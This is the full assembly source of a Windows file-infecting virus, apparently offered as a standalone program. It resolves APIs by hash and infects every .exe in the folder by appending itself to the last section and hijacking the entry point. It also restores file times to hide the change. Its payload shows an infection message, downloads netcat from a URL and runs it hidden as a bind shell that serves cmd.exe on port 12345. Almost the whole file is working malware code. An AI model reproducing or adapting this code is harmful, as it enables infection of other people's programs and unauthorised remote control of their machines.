
[BITS 32]

%include "win32n.inc"

main:
prog_start:
	pushad
	
	call _start
_start:
	pop ebp
	sub ebp, _start					; Delta offset trick
;----------------------------------------------------------------	
;	Retrieve export table to get kernelbase
;----------------------------------------------------------------
	
	sub esp, urlmon_count				; Reserve space for urlmon APIs
	sub esp, shell32_count				; Reserve space for shell32 APIs
	sub esp, user32_count				; Reserve space for user32 APIs
	sub esp, kernel32_count				; Reserve space for kernel32 APIs
	mov ebx, esp						; ebx save API base pointer
	push dword [ebp + dwOriginalEntryPoint]	; save original entry point
	
	mov eax, [fs:0x30]					; Get pointer to PEB
	mov eax, [eax + 0x0C]				; Get PEB->Ldr
	mov eax, [eax + 0x14]				; Get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
	mov eax, [eax]						; InMemoryOrder Module entry 2
	mov eax, [eax]						; InMemoryOrder Module entry 3
	mov eax, [eax + 0x10]				; Go to kernel32 base address
	mov [ebp + dwKernelBase], eax		; Save kernel32 base address to dwKernelBase offset
	
	
	;	load DLL modules from kernel32
	mov edx, [ebp + dwKernelBase]
	lea eax, [ebp + kernel32_apis]
	mov ecx, kernel32_count
	shr ecx, 2
		call loadAPIs
	
		
	; use LoadLibrary to load User32.dll
	mov eax, [ebx + 36] ; LoadLibraryA
	lea edx, [ebp + user32]
	push edx
		call eax 		; After call, eax hold base address of User32.dll load point
	mov [ebp + dwUser32], eax	; Save User32.dll load point
	
	;	load DLLs modules from user32
	push ebx
	add ebx, kernel32_count
	mov edx, [ebp + dwUser32]
	lea eax, [ebp + user32_apis]
	mov ecx, user32_count
	shr ecx, 2
		call loadAPIs
	pop ebx
	
	; use LoadLibrary to load Shell32.dll
	lea edx, [ebp + shell32]
	push edx
		call [ebx + 36]
	mov [ebp + dwShell32], eax
	
	; load DLLs modules from shell32
	push ebx
	add ebx, kernel32_count + user32_count
	mov edx, [ebp + dwShell32]
	lea eax, [ebp + shell32_apis]
	mov ecx, shell32_count
	shr	ecx, 2
		call loadAPIs
	pop ebx
	
	
	; use LoadLibrary to load Urlmon.dll
	lea edx, [ebp + urlmon]
	push edx
		call [ebx + 36]
	mov [ebp + dwUrlmon], eax
	
	; load DLLs modules from shell32
	push ebx
	add ebx, kernel32_count + user32_count + shell32_count
	mov edx, [ebp + dwUrlmon]
	lea eax, [ebp + urlmon_apis]
	mov ecx, urlmon_count
	shr	ecx, 2
		call loadAPIs
	pop ebx
	
	
;------------------------------------------------------------------
;	Infect to all .EXE file in the same folder
;------------------------------------------------------------------
	
;	Find the list of .EXE file in current directory
	sub esp, 324	; Reserve WIN32_FIND_DATA variable for FindFirstFile (320 bytes) + search handle
	push esp		; First arg (WIN32_FIND_DATA) for FindFirstFile
	lea edx, [ebp + exeText]
	push edx		; File name
		call [ebx + 16]	; FindFistFileA
	inc eax
	jz endInfection
	dec eax
	mov dword [esp + 320], eax	; Save search handle

;	Infect to all .EXE files
_startInfection:
	push esp
		call infectFile
	;push esp		; WIN32_FIND_DATA return by FindFirstFile
	push dword [esp + 320 + 4]	; search handle
		call [ebx + 20] ;FindNextFileA
	test eax, eax
	jnz _startInfection
	
endInfection:
	add esp, 324
	
;------------------------------------------------------------------
;	Main payload
;------------------------------------------------------------------
	
	;	Test by call MessageBox
	push 0
	lea eax, [ebp + tlt]
	push eax
	lea eax, [ebp + msg]
	push eax
	push 0
		call [ebx + kernel32_count]
		
	; Download netcat from known host
	xor edi, edi
	push edi		; lpfnCB = NULL
	push edi		; dwReserved
	lea eax, [ebp + ncpath]	; location in which nc is placed
	push eax
	lea eax, [ebp + nclink]	; url of the place holds nc
	push eax
	push edi		; pCaller = NULL
		call [ebx + kernel32_count + user32_count + shell32_count]
	
	; Run nc as a server
	xor edi, edi
	push dword 0	; nShowCmd = SW_HIDE
	push edi		; lpDirectory = NULL
	lea eax, [ebp + ncextend]	; list of arguments
	push eax
	lea eax, [ebp + ncpath]		; path to nc
	push eax
	push edi		; lpOperation = NULL
	push edi		; lphwd = NULL
		call [ebx + kernel32_count + user32_count]
	
;------------------------------------------------------------------
;	Return to host program
;------------------------------------------------------------------
	
	call [ebx - 4]
	
end_run:
	
	push 0
		call [ebx + 12] ; ExitProcess
	
	popad
	ret
	
;------------------------------------------------------------------
;	Sub-routines
;------------------------------------------------------------------


;	Infect the program into File having handle put in EAX
;	Parameters:
;		EAX:	File handle of infected file
;	Return:
;
infectFile:
	mov eax, dword [esp + 4]
	sub esp, 4	; esp + 56  --> PointerToRawData
	sub esp, 24 ; esp + 32  --> LastWriteTime, LastAccessTime, CreationTime
	sub esp, 4	; esp + 28	--> Actual File size
	sub esp, 4	; esp + 24	--> New Entry Point
	sub esp, 4	; esp + 20	--> Mapping File Address
	sub esp, 4	; esp + 16	--> Mapping File Handle
	sub esp, 4	; esp + 12	--> File Handle
	sub esp, 4	; esp + 8	--> File original attributes
	push eax	; esp + 4	--> WIN32_FIND_DATA for infected file
	sub esp, 4	; esp		--> File size
	mov edx, [eax + WIN32_FIND_DATA.nFileSizeLow]
	mov [esp + 28], edx
	add edx, prog_sz + 1000h ;	--> new file size = original file size + prog_sz + extra space
	mov [esp], edx	; save file size
	
	;	get file attributes
	lea esi, [eax + WIN32_FIND_DATA.cFileName] ; get file name
	push esi
		call [ebx + 28] ; GetFileAttributesA
	mov [esp + 8], eax ; save original attributes 
	
	;	clear all old attributes
	push dword 0x80	; FILE_ATTRBUTE_NORMAL  --> clear all attributes
	push esi		; esi hold WIN32_FIND_DATA.cFileName
		call [ebx + 48] ; SetFileAttributesA
	
	;	Open file for infection
	xor edi, edi
	push edi			; hTemplateFile is NULL
	push edi			; dwFlagsAndAttributes = NULL mean any file
	push 0x3			; dwCreationDisposition = OPEN_EXISTING
	push edi			; security option should be 0
	push edi			; dwShareMode = 0 to prevent other processes from open file
	push 0xC0000000		; dwDesiredAccess = (GENERIC_READ | GENERIC_WRITE)
	push esi			; lpFileName = WIN32_FIND_DATA.cFileName
		call [ebx + 4]	; CreateFileA
	inc eax	
	jz _end_infectFile	; do nothing if can not open file
	dec eax
	mov dword [esp + 12], eax	; Save file handle
	
	;	Save original file time attributes
	lea edx, [esp + 32]
	push edx		;	--> lpLastWriteTime
	add edx, 8
	push edx		;	--> lpLastAccessTime
	add edx, 8
	push edx		;	--> lpCreationTime
	push eax		;	--> File handle return from CreateFile
		call [ebx + 32]	; GetFileTime
	
	;	Open File Mapping for editing
	xor edi, edi
	push edi					; Mapping file have no name
	push dword [esp + 4]		; dwMaximumSizeLow = file size 
	push edi					; dwMaximumSizeHigh == NULL
	push 0x04					; Open in readwrite
	push edi					; lpAttribute == NULL
	push dword [esp + 12 + 20]	; File handle
		call [ebx + 8]	; CreateFileMappingA
	mov [esp + 16], eax		; Save mapping handle
	
	;	Open map file
	push dword [esp]			; dwNumberOfBytesToMap = filesize
	push edi					; file offset where the view begin == NULL
	push edi					; file offset where the view end == NULL
	push dword 2				; dwDesiredAccess = file map write
	push dword [esp + 16 + 16]	; file map handle
		call [ebx + 40]	; MapViewOfFile
	mov edx, eax
	mov [esp + 20], eax		; Save mapping address
	
	;	Checking for PE format
	
	;	Check for MZ header
	cmp	word [edx], 'MZ'
	jne	_unmap_infectFile
	
	;	Check if file has already infected
	cmp byte [edx + 50h], 'H'
	je _unmap_infectFile
	mov byte [edx + 50h], 'H' ;	Add infect mark
	
	;	Check for real PE file
	add edx, dword [edx + 3ch]
	cmp word [edx], 'PE'
	jne _unmap_infectFile
	
	;	Update amount of data need to be written
	mov esi, [esp]
	mov [esp + 28], esi
	
	
	;	Start to infect file
	
	
	
	
	
	mov esi, edx	; esi point to PE header
	movzx esi, word [esi + 6]	; esi = number of sections
	dec esi
	imul esi, 0x28	; esi = offset to the last section
	
	;	Go to Section table
	mov ecx, edx	; ecx point to PE file header
	add ecx, 18h	; go to optional header
	movzx eax, word [edx + 14h] ; get Optional Header size
	add ecx, eax 	; ecx point to start of section table
	
	;	Change entry point
	add esi, ecx						; esi point to the last section in the table
	mov eax, [esi + 0xc]				; eax = VitualAddress of the last section
	add eax, [esi + 0x8]				; eax = VitualAddress of the the last element = new entry point
	mov [esp + 24], eax					; save new entry point
	mov eax, [edx + 0x28]				; get original entry point
	add eax, [edx + 0x34]				; original entry point + ImageBase = original entry point virtual address
	mov [ebp + dwOriginalEntryPoint], eax
	mov eax, [esp + 24]					; set new entry point
	mov [edx + 0x28], eax
	
	;	Update last section flags
	or dword [esi + 0x24], 00000020h | 20000000h | 80000000h | 80h	; Allow READ, WRITE, EXECUTE
	
	;	Adjust VirtualSize of the last section
	add dword [esi + 0x08], prog_sz		; ;	new VirtualSize = old Virtual + prog_sz	
	
	;	Adjust SizeOfRawData of the last section
	mov eax, [esi + 0x08]
	dec eax
	mov ecx, edx			; ecx point to PE header, edx must be used to store division remainder
	xor edx, edx
	div dword [ecx + 0x3c]	; divide by the FileAlignment
	inc eax
	mul dword [ecx + 0x3c]
	mov [esi + 0x10], eax	; Update SizeOfRawData
	
	;	Adjust SizeOfImage
	mov eax, [esi + 0x08]	; SizeOfImage = VirtualAddress of last section + VirtualSize of last section
	add eax, [esi + 0x0c]
	mov [ecx + 0x50], eax	; Update ImageSize
	
	;	Copy data
	mov edi, [esi + 0x14]		; get PointerToRawData
	add edi, [esi + 0x08]		; add VirtualSize
	sub edi, prog_sz			; sub prog_sz = entrypoint
	add edi, [esp + 20]			; add map address
	lea esi, [ebp + prog_start]	; starting point
	mov ecx, prog_sz	; data size
	cld
	rep movsb
	
	
	
	
_unmap_infectFile:
	push dword [esp + 28]	; Update the number of bytes need to flush
	push dword [esp + 20 + 4]
		call [ebx + 24]	; FlushViewOfFile
	push dword [esp + 20]
		call [ebx + 60] ;	UnmapViewOfFile
	push dword [esp + 16]
		call [ebx]	; CloseHandle
	
	;	restore original file time attributes
	lea edx, [esp + 32]
	push edx					;	--> lpLastWriteTime
	add edx, 8
	push edx					;	--> lpLastAccessTime
	add edx, 8
	push edx					;	--> lpCreationTime
	push dword [esp + 12 + 12]	;	--> File handle return from CreateFile
		call [ebx + 56]	;	SetFileTime
	
	;	Update end of file
	push 0	; the starting point is zero or the beginning of the file
	push 0	; DistanceToMoveHigh = NULL
	push dword [esp + 28 + 8]	; pointerToRawData + new SizeOfRawData or Original FileSize
	push dword [esp + 12 + 12]	; Opened file handle
		call [ebx + 52]	; SetFilePointer
	push dword [esp + 12]
		call [ebx + 44]	; SetEndOfFile
	
	push dword [esp + 12]
		call [ebx]	; CloseHandle
	
_end_infectFile:
	
	; Restore original attribute
	push dword [esp + 8]
	mov eax, [esp + 4 + 4]
	lea eax, [eax + WIN32_FIND_DATA.cFileName]
	push eax
		call [ebx + 48]	; SetFileAttributesA
	
	
	add esp, 4
	add esp, 4
	add esp, 4
	add esp, 4
	add esp, 4
	add esp, 4
	add esp, 4
	add esp, 4
	add esp, 4
	add esp, 24
	
	ret


;	Load all API listed whose CRC listed in a given list
;	Parameters
;		ECX			Number of API
;		EDX			Import directory base
;		EAX			Pointer to list of APIs' CRC
;	Return
;		All API address has been load to their CRC entry
loadAPIs:
	push edi
	push esi
	push 0		; esp + 16
	push ecx	; esp + 12
	push ecx	; esp + 8
	push edx	; esp + 4
	push eax	; esp
	mov esi, [esp + 4]
	add esi, [esi + 0x3c]				; Start of PE header
	mov esi, [esi + 0x78]				; RVA of Data Directory Export
	add esi, [esp + 4]					; VA of Data Directory Export
	mov [esp + 16], esi					; Save Export Directory
	mov esi, [esi + 0x20]				; RVA of Names Array contain RVAs of function String
	add esi, [esp + 4]					; VA of Names Array contain RVAs of function String
	
	mov edi, ebx		; esi hold function addresses
	xor ebx, ebx
	cld
	
_searcher:
	inc ebx
	lodsd
	add eax, [esp + 4]	; eax points to string of a function
		call generateCRC
	mov ecx, [esp + 8]
	mov edx, [esp]		; edx hold CRC of functions
_compare:
	push edx			
	mov edx, [edx]
	cmp edx, eax
	pop edx
	je _found_api
	add edx, 4
	loop _compare
	jmp _searcher
_found_api:
	push ebx		;	Operation involved esp must add extra 4
	dec ebx
	mov eax, [esp + 16 + 4]
	mov eax, [eax + 0x24]			; RVA of EOT
	add eax, [esp + 4 + 4] 			; VA of EOT
	movzx eax, word [ebx*2 + eax]	; eax holds the oridinal of function
	mov ebx, [esp + 16 + 4]
	mov ebx, [ebx + 0x1C]			; RVA of EAT
	add ebx, [esp + 4 + 4]			; VA of EAT
	mov ebx, [eax*4 + ebx]
	add ebx, [esp + 4 + 4]
	mov [edi], ebx
	add edi, 4		;Go to next function
	pop ebx
	mov eax, [esp+12]
	dec eax
	mov [esp+12], eax
	jnz _searcher
	
	mov eax, [esp + 8]
	shl eax, 2
	sub edi, eax
	mov ebx, edi
	
	pop eax
	pop edx
	pop ecx
	add esp, 8
	pop esi
	pop edi
	ret

;	Generate CRC 32-bit Hash for a API name to optimize program size
;	Parameter(s):
;		EAX		Pointer to the API name
;	Return
;		EAX		32-bit Hash of API name 
generateCRC:
	push ebx
    push ecx
    or ebx,-1
_byteByByte:
	xor bl,byte [eax]
	push 8
	pop ecx
_bitBybit:
    shr ebx,1
    jnc _skip
    xor ebx,0xEDB88320
_skip:
    loop _bitBybit
	inc eax
	cmp byte [eax],0
	jnz _byteByByte
    mov eax,ebx  ;eax = api function string checksum
    pop ecx
    pop ebx
	ret

		


;SECTION .data
	
;-------------------------------------------------------------------------
;	Variables
;-------------------------------------------------------------------------
global_data:
	dwKernelBase 			dd 0		; Addess of kernel base in import table
	dwOriginalEntryPoint 	dd 1		; Original entry point, progoram must call to this address at the end
	dwUser32 				dd 0		; Address of User32.dll in import table
	dwShell32				dd 0		; Address of Shell32.dll in import table
	dwUrlmon				dd 0		; Address of Urlmon.dll in import table
	
;-------------------------------------------------------------------------
;	DATA TABLES
;-------------------------------------------------------------------------
	msg db "Your file has been infected", 0
	tlt db "Warning", 0
	nclink db "http://localhost/nc.exe", 0
	ncpath db "nc.exe", 0
	ncextend db "-d -L -p 12345 -e cmd.exe", 0
	user32 db	"User32.dll", 0
	shell32 db "Shell32.dll", 0
	urlmon db "Urlmon.dll", 0
	exeText db "*.exe", 0
	prog_sz equ prog_end - prog_start
;-------------------------------------------------------------------------
;	Windows APIs
;-------------------------------------------------------------------------
	
kernel32_apis:
	UnmapViewOfFile				dd	0xC6E54950		; 60
	SetFileTime					dd	0xDE7FB5FC		; 56
	SetFilePointer				dd	0x1038158B		; 52
	SetFileAttributesA			dd	0xEA9468FD		; 48
	SetEndOfFile				dd	0xDAE64EA5		; 44
	MapViewOfFile				dd	0x5764C7D0		; 40
	LoadLibraryA				dd	0xC03E4272		; 36
	GetFileTime					dd	0xC05002B5		; 32
	GetFileAttributesA			dd	0xCF9FE3E3		; 28
	FlushViewOfFile				dd	0x68865B91		; 24
	FindNextFileA				dd	0x8AD8D6B7		; 20
	FindFirstFileA				dd	0x36142A31		; 16
	ExitProcess					dd	0xDAEF6833		; 12
	CreateFileMappingA			dd	0x4BE46D93		; 8
	CreateFileA					dd	0xAAC4A387		; 4
	CloseHandle					dd	0x4F6CEA0B		; 0
	
	kernel32_count				equ	$ - kernel32_apis
user32_apis:
	MessageBoxA					dd	0xA8D2A271
	
	user32_count				equ	$ - user32_apis
	
urlmon_apis:
	URLDownloadToFileA			dd	0xE1CF0D15
	
	urlmon_count				equ $ - urlmon_apis
	
shell32_apis:
	ShellExecuteA				dd	0x1483EB77
	
	shell32_count				equ $ - shell32_apis

prog_end:
	
	

